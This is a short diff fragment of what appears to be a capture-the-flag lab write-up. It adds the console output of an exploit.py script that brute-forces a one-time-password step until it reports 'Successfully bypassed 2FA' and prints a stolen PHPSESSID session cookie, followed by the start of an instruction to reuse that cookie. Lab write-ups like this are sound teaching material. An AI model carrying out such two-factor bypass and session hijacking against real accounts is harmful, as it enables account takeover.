@@ -638,5 +638,20 @@ try_until_success()
 ```
 Response:
 
-
+thm@rootbox:~/THM$ python3 exploit.py
+Trying OTP: 1337
+DEBUG: OTP submission response status code: 302
+Unsuccessful OTP attempt, redirected to login page. OTP: 1337
+Logged in successfully.
+Trying OTP: 1337
+DEBUG: OTP submission response status code: 302
+Unsuccessful OTP attempt, redirected to login page. OTP: 1337
+Logged in successfully.
+Trying OTP: 1337
+DEBUG: OTP submission response status code: 302
+Session cookies: {'PHPSESSID': 'rfthio54u96va4sslf2agphld6'}
+Successfully bypassed 2FA with OTP: 1337
 ```
+
+then add the session cookies:
+
